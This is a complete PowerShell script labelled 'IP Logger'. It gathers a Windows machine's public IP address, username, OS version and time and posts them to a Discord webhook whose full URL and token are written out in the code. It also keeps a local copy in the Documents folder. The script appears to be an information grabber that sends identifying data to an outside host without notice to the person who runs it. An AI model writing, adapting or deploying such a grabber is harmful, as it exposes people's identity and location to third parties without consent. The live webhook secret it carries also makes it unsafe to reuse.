# Get public IP
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org")
# Get username
$user = $env:USERNAME
# Get machine / Windows info
$os = (Get-CimInstance Win32_OperatingSystem).Caption
# Get time
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Compose message
$message = "$time | $user | $os | IP: $ip"

# Discord webhook URL (replace with your webhook)
$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"

# Create JSON payload
$payload = @{
    content = $message
    username = "IP Logger"
} | ConvertTo-Json

# Send to Discord
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Host "Data sent successfully!" -ForegroundColor Green
} catch {
    Write-Host "Failed to send data: $_" -ForegroundColor Red
}

# Optional: Also save locally as backup
$doc = [Environment]::GetFolderPath("MyDocuments")
$out = Join-Path $doc "ip.txt"
Add-Content -Path $out -Value $message
